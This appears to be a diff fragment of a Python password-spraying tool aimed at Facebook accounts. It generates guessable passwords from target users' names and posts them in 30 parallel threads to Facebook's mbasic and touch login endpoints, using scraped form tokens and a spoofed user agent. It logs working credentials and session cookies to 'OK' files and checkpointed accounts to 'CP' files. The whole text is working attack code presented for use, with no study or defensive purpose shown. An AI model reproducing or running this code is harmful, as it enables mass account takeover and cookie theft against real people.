+				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "www.facebook.com" in send.json()["error_msg"]:
+				print("\r\033[0;95m[GUPTA-CP] %s|%s\033[0;97m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+ 
+		loop += 1
+	except:
+		pass
+ 
+def mbasic(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
+	global loop, token
+	sys.stdout.write(
+		"\r\033[0;91m[\033[0;92mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"12345", name+"123456" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"12345", 223344 ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"12345", name ]
+	else:
+		pwx = [ name+"123", name+"12345", "445566" ]
+	try:
+		for pw in pwx:
+			kwargs = {}
+			pw = pw.lower()
+			ses = requests.Session()
+			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+			b = parser(p,"html.parser")
+			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+			for i in b("input"):
+				try:
+					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+					else:continue
+				except:pass
+			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				ok.append("%s|%s"%(uid, pw))
+				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "checkpoint" in ses.cookies.get_dict().keys():
+				print("\r\033[0;95m[GUPTA-CP] %s|%s\033[0;91m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+ 
+		loop += 1
+	except:
+		pass
+ 
+def mobile(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
+	global loop, token
+	sys.stdout.write(
+		"\r\033[0;91m[\033[0;92mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"12345", name+"123" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"12345", 223344 ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"12345", name ]
+	else:
+		pwx = [ name+"123", name+"12345", "234567" ]
+	try:
+		for pw in pwx:
+			kwargs = {}
+			pw = pw.lower()
+			ses = requests.Session()
+			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
+			b = parser(p,"html.parser")
+			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+			for i in b("input"):
+				try:
+					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+					else:continue
+				except:pass
+			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;92m"%(uid, pw, kuki))
+				ok.append("%s|%s"%(uid, pw))
+				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "checkpoint" in ses.cookies.get_dict().keys():
+				print("\r\033[0;95m[GUPTA-CP] %s|%s\033[0;91m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+ 
+		loop += 1
+	except:
+		pass
+ 
+def manual():
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
+	global loop, token
+	print("\n[+] Type , For 2nd Password For Example : 223344,445566,334455,234567,778899 etc")
+	asu = raw_input("[+] Enter Passwords : ").split(",")
+	if len(asu) =="":
+		exit("[?] Wrong Input")
+	def main(user):
+		global loop, token
+		sys.stdout.write(
+			"\r\033[0;91m[\033[0;92mCracking\033[0;91m]\033[0;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		); sys.stdout.flush()
+		uid, name = user.split("<=>")
+		try:
+			for pw in asu:
+				kwargs = {}
+				pw = pw.lower()
+				ses = requests.Session()
+				ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
+				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
+				b = parser(p,"html.parser")
+				bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
+				for i in b("input"):
+					try:
+						if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
+						else:continue
+					except:pass
+				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
+				if "c_user" in ses.cookies.get_dict().keys():
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r\033[0;92m[GUPTA-OK] %s|%s|%s\033[0;91m"%(uid, pw, kuki))
+					ok.append("%s|%s"%(uid, pw))
+					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+					break
+					continue
+				elif "checkpoint" in ses.cookies.get_dict().keys():
+					print("\r\033[0;95m[GUPTA-CP] %s|%s\033[0;91m        "%(uid, pw))
+					cp.append("%s|%s"%(uid, pw))
+					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+					break
+					continue
+ 
+			loop += 1
+		except:
+			pass
+	p = ThreadPool(30)
+	p.map(main, id)
+	exit("###  [>Program Close<]")
+ 
+def setting_ua():
+	print("[1] Change User-Agent")
+	print("[2] Default User-Agent")
+	ua = raw_input("\n [?] Choose : ")
+	if ua =="":
+		menu()
+	elif ua == "1":
+		c_ua = raw_input(" [+] Enter User-Agent : ")
+		open(".ua", "w").write(c_ua)
+		time.sleep(1)
+		raw_input("\n [!] Press Enter To Save User-Agent")
+		menu()
+	elif ua == "2":
+		print("Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16;]")
+		os.system("rm -f .ua")
+		time.sleep(1)
+		raw_input("\n[•] User-Agent Save Successfully")
+		menu()
+ 
+def buat_folder():
+	try:os.mkdir("CP")
+	except:pass
+	try:os.mkdir("OK")
+	except:pass
+ 
+if __name__ == "__main__":
+	os.system("git pull")
+	os.system("touch login.txt")
+	buat_folder()
+	login()
+ 
